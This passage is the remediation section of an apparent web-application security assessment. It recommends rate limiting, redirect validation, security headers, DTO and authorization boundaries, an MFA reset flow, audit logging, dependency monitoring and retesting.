17. **Add anti-automation** to `POST /auth/login`, `POST /auth/register`, `PUT /auth/email`, `PUT /auth/password`, `POST /auth/2fa/enable`, and `POST /auth/2fa/disable`: per-IP and per-account failure counters, exponential back-off, and a CAPTCHA or Cloudflare Turnstile challenge after N failures. Return the same status and body on wrong-password vs. non-existent-account to remove the enumeration oracle.
18. **Validate the `redirect` parameter on `POST /auth/login`** against a scheme (`https:` only) and host allow-list. Reject `javascript:`, `data:`, protocol-relative, and off-domain values.
19. **Set security response headers** on both hostnames on every response: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`), and a `Permissions-Policy` that opts out of unused browser features.
20. **Suppress framework banners.** Remove `X-Powered-By` on both hosts, hide the nginx `Server:` version, and strip Next.js build-identifier disclosure where possible.

## Priority 2 — Medium term (1–3 months)

21. **Introduce a serialization boundary at the API layer.** Every response body should be built from an explicit outbound DTO whose fields are allow-listed; database rows should never be serialised directly. This closes the whole class of "internal field leaks into the API response" defects at once.
22. **Introduce an inbound-DTO / schema-validation boundary.** Every endpoint should declare the exact fields it accepts and reject requests carrying anything else. This closes mass-assignment permanently.
23. **Introduce an authorization layer** with per-resource ownership predicates. Every `GET`, `PUT`, `PATCH`, or `DELETE` on a resource ID should route through the same helper that resolves the JWT's `user_id`, checks `is_admin`, and confirms ownership.
24. **Design a MFA reset flow.** Currently there is no user-facing path to remove a 2FA enrolment except with a password + current TOTP, so a backdoored TOTP is unrecoverable by the victim. A supported flow — identity-verified operator reset, hardware-key backup, or recovery codes issued at enrolment — is required.
25. **Add an audit log for every admin action and every `PUT /admin/orders/{id}/status` state change**, with immutable retention, and alert on state changes made by newly-created admin accounts.
26. **Continuous dependency monitoring.** Track the fingerprinted PHP, Next.js and nginx versions against a CVE feed and re-assess when a relevant advisory is published.
27. **Retest.** After Priority 0 and Priority 1 items land, commission a focused retest of the specific findings and chains listed here to confirm each is closed and no regressions have been introduced. Do not treat any finding as remediated until it has been retested against a running instance.